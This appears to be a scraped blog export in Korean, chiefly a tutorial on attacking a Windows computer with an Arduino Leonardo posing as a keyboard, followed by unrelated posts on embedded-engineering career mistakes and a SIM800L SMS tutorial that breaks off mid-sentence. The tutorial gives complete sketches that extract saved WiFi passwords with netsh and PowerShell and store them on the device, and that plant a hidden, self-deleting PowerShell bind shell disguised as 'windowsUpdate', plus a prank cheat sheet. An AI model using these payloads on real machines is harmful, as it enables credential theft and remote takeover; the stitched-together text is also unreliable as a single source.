Leonardo에 초점을 맞추고 있습니다. 내장 USB 통신을 갖추고 있어 컴퓨터에 연결된 키보드 또는 마우스처럼 위장할 수 있습니다. 다른 Arduino 제품인 Nano와 Uno도 사용해 봤지만, 컴퓨터를 속일 수 없었어요.\n\n![이미지](/assets/img/2024-06-22-HackingacomputerusingArduino_0.png)\n\n이 데모에서는 특정 기능을 수행하는 두 개의 버튼을 설정했습니다. 왼쪽 버튼은 \"위장\" 기능을 트리거하고 동시에 놀라울 정도로 빠른 속도로 키를 입력하고 데이터를 캡처합니다. 오른쪽 버튼은 공격에 사용하는 컴퓨터로 캡처한 데이터를 내보내는 역할을 합니다.\n\n먼저, Arduino Leonardo의 하드웨어 구성 요소를 소개하고 마이크로 컨트롤러 및 마이크로 컨트롤러 키트에서 기본 Arduino 제어기능을 시연해 보겠습니다.\n\n<div class=\"content-ad\"></div>\n\n아두이노 보드는 모두 setup 함수와 loop 함수로 구성되어 있어요.\n\n## Setup 함수\n\n이 함수는 아두이노가 전원이 켜질 때 한 번만 실행돼요.\n\n## Loop 함수\n\n<div class=\"content-ad\"></div>\n\n이 기능은 설정 함수를 실행하면 계속 실행됩니다.\n\n![이미지](/assets/img/2024-06-22-HackingacomputerusingArduino_1.png)\n\n회로 기판(왼쪽) 다이어그램에서 버튼이 각각 핀 2와 핀 3에 연결되어 있음을 알았습니다. 따라서 스케치(오른쪽)에서 pinMode(2, INPUT); 및 pinMode(3, INPUT);를 각각 입력 구성 요소로 정의했습니다. loop 함수는 우리 함수의 실행을 정의한 곳입니다.\n\n# 공격 1: WiFi 비밀번호 도용\n\n<div class=\"content-ad\"></div>\n\n컴퓨터가 WiFi에 연결될 때마다 WiFi 비밀번호가 시스템에 저장됩니다. 이 좋은 소식은 PowerShell 명령을 활용하여 WiFi 서비스 세트 식별자(SSID)와 비밀번호 목록을 얻을 수 있다는 것입니다.\n\n```js\n#include <Keyboard.h>\n#include <EEPROM.h>\nchar stringArray[500] = {\"\"};\nboolean extracted = false, dispatched = false;\nint extractButton = 2, dispatchButton = 3;\n\nvoid setup() {    \n    Serial.begin(9600);\n    pinMode(extractButton, INPUT);\n    pinMode(dispatchButton, INPUT);\n    Keyboard.begin();\n}\nvoid loop() {\n    if(digitalRead(extractButton) == HIGH && !extracted) {\n        extractingData();\n        extracted = true;\n    }\n    if(digitalRead(dispatchButton) == HIGH && !dispatched) {\n        dispatchingData();\n        dispatched = true;\n    }    \n    if(digitalRead(extractButton) == LOW)\n        extracted = false;\n    if(digitalRead(dispatchButton) == LOW)\n        dispatched = false;\n}\n\nvoid extractingData() {\n    delay(1000);\n    Keyboard.press(KEY_LEFT_GUI);\n    delay(20);\n    Keyboard.release(KEY_LEFT_GUI);\n    delay(500);\n    Keyboard.print(\"Powershell\");\n    delay(500);\n    Keyboard.press(KEY_RETURN);\n    delay(200);\n    Keyboard.release(KEY_RETURN);\n    delay(1000);\n    Keyboard.println(\"(netsh wlan show profiles) | Select-String \\\"\\\\:(.+)$\\\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\\\"$name\\\" key=clear)}  | Select-String \\\"Key Content\\\\W+\\\\:(.+)$\\\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass } | Format-Table -AutoSize | Out-String -OutVariable dataCaptured\");\n    delay(500);\n\n    Keyboard.println(\"$comPort = ((Get-WmiObject -query \\\"SELECT * FROM Win32_PnPEntity\\\" | Where {$_.Name -Match \\\"COM\\\\d+\\\"}).name).Split(\\\"COM\\\")\");\n    delay(200);\n    Keyboard.println(\"$comPort = [int]$comPort[$comPort.length - 1].replace(\\\")\\\", \\\"\\\")\");\n    delay(200);\n    Keyboard.print(\"$serialObject = new-Object System.IO.Ports.SerialPort COM\");\n    Keyboard.print(\"$comPort\");\n    Keyboard.println(\", 9600, None, 8, one\");\n    delay(200);\n    Keyboard.println(\"$serialObject.Open()\");\n    delay(200);\n    Keyboard.println(\"$serialObject.Write(\\\"$dataCaptured\\\")\");\n    delay(200);\n    Keyboard.println(\"$serialObject.close()\");\n    delay(200);\n    Keyboard.println(\"exit\");\n    delay(200);\n    for(int i=0; i<sizeof(stringArray)-1; i++)\n        stringArray[i] = Serial.read();\n    EEPROM.put(1, stringArray);\n}\n\nvoid dispatchingData() {\n    delay(500);\n    Keyboard.press(KEY_LEFT_GUI);\n    delay(20);\n    Keyboard.release(KEY_LEFT_GUI);\n    delay(500);\n    Keyboard.println(\"notepad\");\n    delay(700);\n    Keyboard.press(KEY_RETURN);\n    delay(200);\n    Keyboard.release(KEY_RETURN);\n    delay(1000);\n    Keyboard.print(EEPROM.get(1, stringArray));\n}\n```\n\n# 공격 요약\n\n- 먼저 Arduino Leonardo를 트롤하는 컴퓨터에 USB 포트를 통해 연결합니다. 앞서 언급한 두 개의 버튼을 기억하시나요? 왼쪽 버튼을 누르면 프로그램이 PowerShell 터미널을 시작하고 명령을 입력하기 시작합니다.\n- 프로그램은 WiFi의 SSID와 비밀번호를 추출하여 Arduino의 전기적으로 지워지지 않는 프로그램 가능 읽기 전용 메모리(EEPROM)에 저장합니다. 비휘발성 플래시 메모리 장치이므로 저장된 정보는 더 이상 전원이 공급되지 않아도 유지됩니다.\n- Arduino가 기능을 실행한 후에는 피해자 컴퓨터에서 이를 분리하고 제 컴퓨터에 연결합니다. 이번에는 EEPROM에 저장된 데이터를 Arduino가 내 컴퓨터로 덤프하는 오른쪽 버튼을 누릅니다.\n\n<div class=\"content-ad\"></div>\n\n# WiFi SSID 표시 명령어\n\n```js\n(netsh wlan show profiles) |\nSelect-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} |\n%{(netsh wlan show profile name=\"$name\" key=clear)} |\nSelect-String \"Key Content\\W+\\:(.+)$\" |\n%{$pass=$_.Matches.Groups[1].Value.Trim(); $_} |\n%{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass } |\nFormat-Table –AutoSize |\nOut-String -OutVariable dataCaptured\n```\n\n<img src=\"/assets/img/2024-06-22-HackingacomputerusingArduino_2.png\" />\n\nWiFi SSID 표시 명령어가 길고 이해하기 어렵습니다. 이 글의 다음 부분에서는 명령어를 몇 가지 소화 가능한 섹션으로 나눠 코드의 기능을 이해하기 쉽게 설명하겠습니다.\n\n<div class=\"content-ad\"></div>\n\n# 명령어 이해하기\n\n## 섹션 A\n\n이 명령어 섹션은 캐시된 SSID를 표시하고 \":(.+$\" 문자열을 정규 표현식으로 필터링합니다.\n\n```js\n(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim();\n```\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-22-HackingacomputerusingArduino_3.png\" />\n\n## 섹션 B\n\n```js\n%{(netsh wlan show profile name=\"$name\" key=clear)}\n```\n\n이전 파이프에서 검색한 $name 변수를 사용했음을 주의하세요. netsh wlan 함수를 다시 호출하여 SSID에 대한 추가 정보를 얻습니다.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-22-HackingacomputerusingArduino_4.png\" />\n\n## 섹션 C\n\n여기서 Key Content(비밀번호)를 추출하여 $pass 변수에 할당합니다.\n\n```js\nSelect-String \"Key Content\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_}\n```\n\n<div class=\"content-ad\"></div>\n\n## 섹션 D\n\n마지막으로, 프로필 이름과 비밀번호 속성을 포함한 PS 객체를 생성하고 테이블 형식으로 표시하여 $dataCaptured에 작성합니다.\n\n```js\n%{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass } | Format-Table –AutoSize | Out-String -OutVariable dataCaptured\n```\n\n# EEPROM에 데이터 저장하는 명령\n\n<div class=\"content-ad\"></div>\n\n아두이노에 데이터를 기록하려면 컴퓨터와 아두이노는 직렬 통신을 사용하여 상호 작용해야 합니다. 직렬 통신은 통신 채널 또는 USB를 통해 한 번에 한 비트씩 데이터를 전송하는 프로세스입니다. 각 포트는 COM1, COM2, COM3, COM4 등으로 식별됩니다. 각 COM은 입출력(I/O) 및 인터럽트 요청(IRQ) 주소를 나타냅니다. I/O 주소는 마우스나 키보드와 같은 주변 장치와 데이터를 전송하고 수신합니다. 직렬 통신의 속도 또는 '보드 속도'는 초당 비트로 측정됩니다. 이 데모에서는 9600비트 초당을 사용했습니다.\n\n```bash\n# 사용 가능한 COM 포트 검색\n$comPort = ((Get-WmiObject -query \"SELECT * FROM Win32_PnPEntity\" | Where {$_.Name -Match \"COM\\d+\"}).name).Split(\"COM\");\n$comPort = [int]$comPort[$comPort.length - 1].replace(\")\", \"\");\n\n# COM 포트에 연결하여 데이터 기록 시작\n$serialObject = new-Object System.IO.Ports.SerialPort COM$comPort , 9600, None, 8, one;\n$serialObject.Open();\n$serialObject.Write(\"$dataCaptured\");\n```\n\n데이터를 전송한 후, 아두이노를 피해자의 컴퓨터에서 분리하여 내 컴퓨터에 연결합니다. 그런 다음, 캡처된 데이터를 제 노트패드로 전송하는 배송 프로세스를 시작하려면 오른쪽 버튼을 트리거합니다.\n\n![이미지](/assets/img/2024-06-22-HackingacomputerusingArduino_5.png)\n\n<div class=\"content-ad\"></div>\n\n# 공격 2: 쉘 열기\n\n여기서 여러분은 아마 생각하고 있을거에요: 우리 피해자의 WiFi SSID와 비밀번호를 훔치는 것에 그치지 말고 더 많은 정보를 얻을 수는 없을까요? 이 섹션에서는 쉘을 열어보는 방법을 보여드릴게요.\n\n```js\n#include <Keyboard.h>\n#include <EEPROM.h>\n\nchar stringArray[50] = {\"\"};\nboolean extracted = false, dispatched = false;\nint extractButton = 2, dispatchButton = 3;\nvoid setup() {\n    Serial.begin(9600);\n    pinMode(extractButton, INPUT);\n    pinMode(dispatchButton, INPUT);\n    Keyboard.begin();\n}\nvoid loop() {\n    if(digitalRead(extractButton) == HIGH && !extracted) {\n        shell();\n        extracted = true;\n    }\n    if(digitalRead(dispatchButton) == HIGH && !dispatched) {\n        ipaddr();\n        dispatched = true;\n    }\n    if(digitalRead(extractButton) == LOW)\n        extracted = false;\n    if(digitalRead(dispatchButton) == LOW)\n        dispatched = false;\n}\n\nvoid shell() {\n    delay(1000);\n    Keyboard.press(KEY_LEFT_GUI);\n    delay(20);\n    Keyboard.release(KEY_LEFT_GUI);\n    delay(500);\n    Keyboard.print(\"cmd\");\n    delay(500);\n    Keyboard.press(KEY_RETURN);\n    delay(200);\n    Keyboard.release(KEY_RETURN);\n    delay(1000);\n    Keyboard.println(\"set updateSource=\\\"function windowsUpdate{$stream=$client.GetStream();[byte[]]$bytes=0..65535^|^%{0};$sendbytes=([text.encoding]::ASCII).GetBytes('Running as user '+$env:username+' on '+$env:computername+'.');$stream.Write($sendbytes,0,$sendbytes.Length);$sendbytes=([text.encoding]::ASCII).GetBytes('PS '+(Get-Location).Path+'^>');$stream.Write($sendbytes,0,$sendbytes.Length);while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$EncodedText=New-Object -TypeName System.Text.ASCIIEncoding;$data=$EncodedText.GetString($bytes,0,$i);try{$sendback=(IEX -Command $data 2^>^&1 ^| Out-String );}catch{}$sendback2  = $sendback + 'PS ' + (Get-Location).Path + '^> ';$x = ($error[0] ^|Out^-String);$error.clear();$sendback2 = $sendback2 + $x;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close();if($listener){$listener.Stop();}$listener=[System.Net.Sockets.TcpListener]5566;$listener.start();rm update.ps1;$client=$listener.AcceptTcpClient();windowsUpdate\\\"\");\n    delay(500);\n\n    Keyboard.println(\"echo %updateSource:~1,1014%>update.ps1\");\n    delay(200);\n    Keyboard.println(\"powershell -ep bypass -windowstyle hidden -file update.ps1\");\n    delay(500);\n\n    Keyboard.press(KEY_LEFT_GUI);\n    delay(20);\n    Keyboard.release(KEY_LEFT_GUI);\n    delay(500);\n    Keyboard.print(\"Powershell\");\n    delay(500);\n    Keyboard.press(KEY_RETURN);\n    delay(200);\n    Keyboard.release(KEY_RETURN);\n    delay(1000);\n    Keyboard.println(\"Get-NetIPAddress -AddressFamily IPv4 -suffixorigin dhcp|select ipaddress|Out-String -OutVariable d\");\n    delay(200);\n    Keyboard.println(\"$c=((Get-WmiObject -query \\\"SELECT * FROM Win32_PnPEntity\\\"|Where{$_.Name -Match \\\"COM\\\\d+\\\"}).name).Split(\\\"COM\\\")\");\n    delay(200);\n    Keyboard.println(\"$c=[int]$c[$c.length-1].replace(\\\")\\\",\\\"\\\")\");\n    delay(200);\n    Keyboard.print(\"$s=new-Object System.IO.Ports.SerialPort COM\");\n    Keyboard.print(\"$c\");\n    Keyboard.println(\",9600,None,8,one\");\n    delay(200);\n    Keyboard.println(\"$s.Open()\");\n    delay(200);\n    Keyboard.println(\"$s.Write(\\\"$d\\\")\");\n    delay(200);\n    Keyboard.println(\"$s.close()\");\n    delay(200);\n    Keyboard.println(\"exit\");\n    delay(200);\n\n    for(int i=0; i<sizeof(stringArray)-1; i++)\n        stringArray[i] = Serial.read();\n\n    EEPROM.put(1, stringArray);\n}\nvoid ipaddr() {\n    delay(500);\n    Keyboard.press(KEY_LEFT_GUI);\n    delay(20);\n    Keyboard.release(KEY_LEFT_GUI);\n    delay(500);\n    Keyboard.println(\"notepad\");\n    delay(700);\n    Keyboard.press(KEY_RETURN);\n    delay(200);\n    Keyboard.release(KEY_RETURN);\n    delay(1000);\n    Keyboard.print(EEPROM.get(1, stringArray));\n}\n```\n\n위의 코드는 복잡해 보일 수 있으니, 단계별로 살펴보도록 하죠:\n\n<div class=\"content-ad\"></div>\n\n- 아두이노를 피해자 컴퓨터에 연결한 후 왼쪽 버튼을 누르면, 프로그램이 명령 프롬프트를 실행하고, 거기에 PowerShell 쉘 코드를 저장하는 updateSource라는 명령 프롬프트 변수를 생성합니다.\n- 그 후에 프로그램은 updateSource의 값이 기록된 PowerShell 스크립트 update.ps1을 생성합니다.\n- 마지막으로 프로그램은 명령 프롬프트 코드 powershell -ep bypass -windowstyle hidden -file update.ps1을 실행합니다. 이로써 update.ps1 프로그램이 백그라운드에서 실행됨을 보장합니다.\n- Exploit을 마치기 전에, 프로그램은 다시 PowerShell을 실행하고 피해자의 IP 주소를 EEPROM에 기록합니다. 이것은 이전에 설명한 WiFi 암호를 전송하는 것과 유사합니다.\n- 아두이노를 피해자 컴퓨터에서 분리한 후 내 컴퓨터에 연결합니다. 이번에는 오른쪽 버튼을 눌러 피해자의 IP 주소를 언로드합니다.\n- bind shell을 설정하기 위해 netcat 연결을 수립하여 공격을 완료합니다.\n\n아래는 정리된 셸 코드 버전입니다:\n\n```js\n# 쉘 기능 정의\nfunction windowsUpdate {\n  $stream = $client.GetStream();\n  [byte[]]$bytes = 0..65535 | %{0};\n  $sendbytes = ([text.encoding]::ASCII).GetBytes('Running as user '+$env:username+' on '+$env:computername+'.');\n  $stream.Write($sendbytes, 0, $sendbytes.Length);\n  $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>');\n  $stream.Write($sendbytes, 0, $sendbytes.Length);\n  while (($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0) {\n    $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding;\n    $data = $EncodedText.GetString($bytes,0,$i);\n    \n    try {\n      # 공격자로부터 명령 수신\n      $sendback=(IEX -Command $data 2 >&1 | Out-String );\n    }\n    catch {}\n    $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> ';\n    $x = ($error[0] | Out-String);\n    $error.clear();\n    $sendback2 = $sendback2 + $x;\n    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\n    $stream.Write($sendbyte, 0, $sendbyte.Length);\n    $stream.Flush();\n  }\n  $client.Close();\n  if ($listener) {\n    $listener.Stop();\n  }\n}\n\n# 연결 대기\n$listener = [System.Net.Sockets.TcpListener] 5566;\n$listener.start();\n\n# 여기서 update.ps1 제거!\nrm update.ps1;\n\n$client = $listener.AcceptTcpClient();\n\n# 함수 호출\nwindowsUpdate;\r\n```\n\n요약하면, 이 프로그램은 접속한 사람이 사용할 수 있는 포트 5566에서 bind shell을 구축하는 기능을 만들었습니다. 프로그램은 들어오는 연결을 기다리면서 update.ps1 파일을 삭제합니다. 이 시점에서 저는 bind shell 함수에 연결하여 피해자의 컴퓨터를 제어하기 시작합니다. PowerShell 스크립팅이 이렇게 간단한 것이죠?\n\n<div class=\"content-ad\"></div>\n\n# 데모 타임\n\n여기 데모에 대한 몇 가지 흥미로운 비디오가 있어요:\n\n- 피해자에게 셸 코드 삽입하고 IP 주소 추출하기\n- IP 주소 송부 및 피해자 컴퓨터 제어하기\n\n<div class=\"content-ad\"></div>\n\n우리의 알지 못하는 희생자들에게 소식을 전하는 여러 가지 방법이 있습니다. 여러분이 할 수 있는 일들에 대한 치트 시트입니다:\n\n```js\n// 피해자의 컴퓨터로 키 입력 보내기\n$wshell = New-Object -ComObject wscript.shell;\n$wshell.sendKeys(\" \");\n$wshell.sendKeys(\"Hahaha\");\n\n// 파일에 쓰기\necho You have been hacked! > hacked.txt\n\n// 메모장으로 파일 열기\nnotepad hacked.txt\n\n\n// 브라우저 닫기\ntaskkill /IM firefox.exe /F\ntaskkill /IM chrome.exe /F\n\n// Firefox를 위한 URL을 열기\ncd \"C:\\Program Files\\Mozilla Firefox\"\nfirefox.exe https://www.google.com/\n\n// Chrome을 위한 URL을 열기\ncd \"경로\\Chrome\"\nchrome.exe https://www.google.com/\r\n```\n\n# 요약\n\n이 글에서는 아두이노의 기본 기능과 EEPROM, 시리얼 통신, USB Rubber Ducky, 그리고 PowerShell 스크립팅을 소개했습니다.\n\n해킹 프로세스가 백그라운드에서 실행되기 때문에 희생자들은 자신의 컴퓨터가 해킹당했는지 감지할 수 없을 것입니다. 컴퓨터가 해킹당하는 잠재적 위험을 줄이기 위해 — 내 친애하는 동료들도 포함하여 — 책상을 비울 때 컴퓨터를 잠그는 것을 항상 기억해 주세요.\n\n<div class=\"content-ad\"></div>\n\n안녕하세요! 사이버 보안은 여러분부터 시작됩니다!\n\n참고 자료:","ogImage":{"url":"/assets/img/2024-06-22-HackingacomputerusingArduino_0.png"},"coverImage":"/assets/img/2024-06-22-HackingacomputerusingArduino_0.png","tag":["Tech"],"readingTime":14},{"title":"임베디드 소프트웨어 엔지니어가 피해야 할 실수 7가지","description":"","date":"2024-06-22 18:51","slug":"2024-06-22-AvoidTheseMistakesasEmbeddedSoftwareEngineer","content":"\n\n내가 임베디드 소프트웨어 엔지니어로 일하면서 첫걸음에 몇 가지 실수를 했는데, 그것들이 나를 속박했었어요. 나는 이 실수들을 공유하여 엔지니어링 학생들이 같은 함정을 피할 수 있도록 도와주고 싶어요. 🚫⚠️\n\n실수 #1: 개발에 IDE에 의존하기 🖥️\n나는 처음에 Arduino와 같은 IDE에 완전히 의존해서 내 임베디드 코드를 작성하고 컴파일했어요. IDE는 빠른 프로토타이핑에 도움이 될 수 있지만, 결국은 전체 툴체인과 개발 프로세스를 정말로 이해하는 것을 방해한다는 점을 깨달았어요.\n\n<div class=\"content-ad\"></div>\n\n![IDEs take away important details like the compiler, linker, debugger, and build system. This might seem convenient at first, but it means you don’t develop a deep understanding of how your code is getting from source to binary. Companies want engineers who understand the nuts and bolts of the entire development workflow, not just what an IDE’s GUI presents.\n\nThe solution? Learn to use a proper toolchain with a command-line build system, standalone compiler, debugger, etc. It’s more work upfront, but you’ll become a far more versatile and valuable embedded engineer.\n\nMistake #2: Not Using Git Effectively\nAnother big mistake I made was not leveraging Git and GitHub properly in my projects. I would typically just upload the final project code to GitHub when I was done, without any of the version history, commit messages, or evidence of my development process.\n\n<div class=\"content-ad\"></div>\n\n![AvoidTheseMistakesasEmbeddedSoftwareEngineer](/assets/img/2024-06-22-AvoidTheseMistakesasEmbeddedSoftwareEngineer_2.png)\n  \n회사들은 코드를 작성하는 것뿐만 아니라, 생각을 많이 하고 반복적으로 개발하는 개발자로 보여줄 필요가 있습니다. 버전 컨트롤을 사용하여 진행 상황을 추적하고 아이디어를 실험하며 도전을 극복하는 개발자가 되어야 합니다. 잘 문서화되고 자주 업데이트되는 프로젝트로 가득 찬 GitHub 프로필은 여러분의 기술에 대해 말해줍니다. 📈👨‍💻\n\n처음부터 Git을 업무 흐름의 핵심 부분으로 만드세요. 조기에 자주 커밋하고 의미 있는 커밋 메시지를 사용하고 프로젝트 전반에 걸쳐 다양한 문제에 대해 어떻게 대처했는지 보여주세요. 이렇게 하면 여러분의 GitHub 프로필이 여러분의 능력을 진정으로 보여주는 포트폴리오가 될 것입니다. 🔄📝\n\n이러한 실수를 초기에 피하는 것은 여러분이 숙련된, 시장에서 인정받을 수 있는 임베디드 소프트웨어 엔지니어로 거듭날 수 있는 강력한 길을 제시합니다. 전체 도구 체인을 이해하고 개발 여정을 문서로 기록하려면 버전 컨트롤에 집중하세요. 이렇게 하면 여러분이 꿈꿔온 임베디드 역할을 얻는 길에 큰 도움이 될 것입니다. 🚀🌟","ogImage":{"url":"/assets/img/2024-06-22-AvoidTheseMistakesasEmbeddedSoftwareEngineer_0.png"},"coverImage":"/assets/img/2024-06-22-AvoidTheseMistakesasEmbeddedSoftwareEngineer_0.png","tag":["Tech"],"readingTime":2},{"title":"SIM800L로 Arduino에서 메시지를 보내고 전화 거는 방법","description":"","date":"2024-06-22 18:49","slug":"2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L","content":"\n\n이 기사에서는 아두이노로 문자 메시지를 보내고 전화를 거는 방법을 공유하고 싶습니다. 그 방법으로 \"SIM800L\"을 사용할 겁니다.\n\n![이미지](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_0.png)\n\nSIM800L은 세계에서 가장 작은 GSM(Global System for Mobile communication) 모듈입니다. 이 모듈은 UART(Universal Asynchronous Receiver / Transmitter)를 통해 아두이노와 데이터를 교환하는 통신 프로토콜을 사용합니다.\n\n이것은 취미 프로젝트에 아주 좋은 저렴한 가격의 솔루션이에요! 아래 링크를 통해 구입할 수 있습니다 (스폰서가 아니에요, 제가 Aliexpress에서 구입했는데 아주 잘 작동합니다!):\n\n<div class=\"content-ad\"></div>\n\n## 하드웨어 구매 링크:\n\n- SIM800L: AliExpress (4$27)\n- 아두이노 메가: AliExpress (11$31)\n- 저항 및 LED 키트: AliExpress (2$74)\n- 점퍼 케이블: AliExpress (1$07)\n- 최소 3.4V-4.4V 및 최소 2A를 제공할 수 있는 파워 뱅크.\n\n# YouTube 비디오\n\n만약 이 튜토리얼의 비디오 버전을 선호한다면, 제 YouTube 채널을 방문해 주세요:\n\n<div class=\"content-ad\"></div>\n\n# 단계 1: 보드에 솔더링하기!\n\n보드를 받았을 때 핀들이 아직 솔더링되지 않았습니다. 따라서 먼저 SIM800L 보드의 핀들을 솔더링해야 합니다. 그리고 이 모듈에는 2개의 안테나가 함께 제공됩니다: 하나는 금속 나선 모양의 안테나이고, 다른 하나는 전선이 달린 녹색 보드입니다.\n\n![이미지1](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_1.png)\n\n![이미지2](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_2.png)\n\n<div class=\"content-ad\"></div>\n\nSIM800L를 외부에서 사용할 계획이라면 나선형 안테나를 사용할 수 있어요. 나선형 안테나를 사용하기 위해서는 전자 기판에 납땜을 해야 해요.\n\n만약 SIM800L를 집 내부 또는 케이스 내부에서 사용할 계획이라면, 보드 버전 안테나를 선택하는 것이 더 나아요. 이 안테나를 사용하면 나선형 안테나에 비해 더 좋은 연결을 얻을 수 있어요. 안테나를 사용하려면 전자 기판에 끼워 넣기만 하면 돼요.\n\n핀들이 기판에 납땜되면 다음과 같이 보일 거예요:\n\n![image](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_3.png)\n\n<div class=\"content-ad\"></div>\n\n\n![SIM800L](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_4.png)\n\n# About SIM800L\n\nThe pins of SIM800L that we are going to use are:\n\n![SIM800L Pins](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_5.png)\n\n\n<div class=\"content-ad\"></div>\n\nSIM800L을 사용하여 문자 메시지를 보내려면 아래와 같이 아두이노 메가에 연결해야 합니다:\n\n![이미지](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_6.png)\n\n![이미지](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_7.png)\n\n여기서는 10 kOhm의 3개의 저항을 배선도에 사용하여 전압을 5V에서 3.3V로 나눕니다. SIM800L 모듈은 3.3V 논리 수준을 갖고 있지만 아두이노는 5V 논리 수준을 갖고 있기 때문에 모듈의 Rx 핀을 아두이노의 디지턈 핀에 직접 연결할 수 없습니다.\n\n<div class=\"content-ad\"></div>\n\n저희 프로젝트에서는 SoftwareSerial 라이브러리를 사용할 예정입니다. 이 라이브러리를 이용하면 아두이노 보드의 다른 디지털 핀을 사용하여 시리얼 통신이 가능하며, 이 기능을 소프트웨어로 구현하여 이름이 \"SoftwareSerial\"인 것입니다. 다만, 이 라이브러리에는 제약 사항이 있습니다. 메가 및 메가 2560 보드의 모든 핀이 변경 인터럽트를 지원하지 않기 때문에 RX로 사용할 수 있는 핀은 다음과 같습니다: 10, 11, 12, 13, 14, 15, 50, 51, 52, 53, A8 (62), A9 (63), A10 (64), A11 (65), A12 (66), A13 (67), A14 (68), A15 (69). 이에 따라 저희의 배선도에서 핀 10과 핀 11을 사용하고 있습니다.\n\n## LED 상태 표시등\n\n<img src=\"/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_8.png\" />\n\n코드를 테스트하기 전에 SIM800L의 LED 표시등을 확인해 보겠습니다. 이 LED는 셀룰러 네트워크의 상태를 나타내기 위해 다른 속도로 깜박입니다.\n\n<div class=\"content-ad\"></div>\n\n- 1초마다 깜빡입니다: 칩은 실행 중이지만 아직 셀룰러 네트워크에 연결되지 않았습니다.\n- 2초마다 깜빡입니다: 요청된 GPRS 데이터 연결이 활성화되었습니다.\n- 3초마다 깜빡입니다: 모듈이 셀룰러 네트워크에 연결되어 음성과 텍스트 메시지를 주고받을 수 있습니다.\n\n## 작동 전압\n\nSIM800L의 작동 전압은 3.4V - 4.4V입니다. 하지만, SMS를 보내거나 전화를 걸 때 전류가 최대 2A까지 증가할 수 있습니다. 이는 매우 중요한 기준입니다. 공급 전력이 적어도 2A와 3.4V를 제공할 수 없다면 SMS를 보내거나 전화를 걸지 못할 수 있습니다.\n\n이 프로젝트에서는 최대 5V와 3A를 제공하는 충전 보조 배터리를 사용했습니다. 보드는 잘 작동하지만, 이상적으로는 동작 전압 범위(3.4V - 4.4V) 내에 공급 전압이 들어오도록 DC-DC 컨버터를 추가하는 것이 좋습니다. 과도한 공급 전력은 보드를 손상시킬 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n## Baud Rate\n\n1200 bps부터 115200 bps까지의 속도를 지원하며 자동 속도 감지 기능이 있습니다. 저희 프로젝트에서는 9600 bps를 사용할 예정입니다.\n\n## 디버깅 팁\n\n# 연결 코드 테스트\n\n<div class=\"content-ad\"></div>\n\n이제 Arduino 보드에 다음 코드를 업로드할 수 있습니다:\n\n```js\n#include <SoftwareSerial.h>\n\n// SIM800L과 통신하기 위한 소프트웨어 시리얼 객체 생성\nSoftwareSerial sim800l(11, 10); // SIM800L Tx & Rx를 Arduino #11 및 #10에 연결\nvoid setup()\n{\n  // Arduino 및 Arduino IDE (시리얼 모니터)와의 시리얼 통신 시작\n  Serial.begin(9600);\n  \n  // Arduino 및 SIM800L과의 시리얼 통신 시작\n  sim800l.begin(9600);\n\n  Serial.println(\"초기화 중...\");\n  delay(1000);\n\n  sim800l.println(\"AT\"); // 핸드셰이크 테스트가 성공하면 'OK'로 반환됩니다.\n  updateSerial();\n  sim800l.println(\"AT+CSQ\"); // 신호 품질 테스트, 값의 범위는 0에서 31까지이며, 31이 가장 좋습니다.\n  updateSerial();\n  sim800l.println(\"AT+CCID\"); // SIM 정보를 읽어 SIM이 꽂혀 있는지 확인합니다.\n  updateSerial();\n  sim800l.println(\"AT+CREG?\"); // 네트워크에 등록되었는지 확인합니다.\n  updateSerial();\n}\n\nvoid loop()\n{\n  updateSerial();\n}\n\nvoid updateSerial()\n{\n  delay(500);\n  while (Serial.available()) \n  {\n    sim800l.write(Serial.read()); // Serial이 전달한 내용을 소프트웨어 시리얼 포트로 전달합니다.\n  }\n  while(sim800l.available()) \n  {\n    Serial.write(sim800l.read()); // 소프트웨어 시리얼이 수신한 내용을 시리얼 포트로 전달합니다.\n  }\n}\n```\n\n시리얼 모니터를 열 때 'Both NL and CR' 옵션이 선택되었는지 확인하세요!\n\nArduino IDE의 시리얼 모니터는 다음 메시지를 반환해야 합니다:\n\n<div class=\"content-ad\"></div>\n\n\n![How to send a message and make a phone call from Arduino with SIM800L - Part 9](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_9.png)\n\n![How to send a message and make a phone call from Arduino with SIM800L - Part 10](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_10.png)\n\n\"AT+CSQ\" 명령어를 입력하면 21,0이 반환됩니다. 신호의 품질이 상당히 좋음을 의미합니다.\n\n\"AT+CCID\" 명령어를 입력하면 xxxxxxxxxxxxxxxxxx (20자리 숫자)가 반환됩니다. 이 명령어는 설치된 SIM 카드의 고유 통합 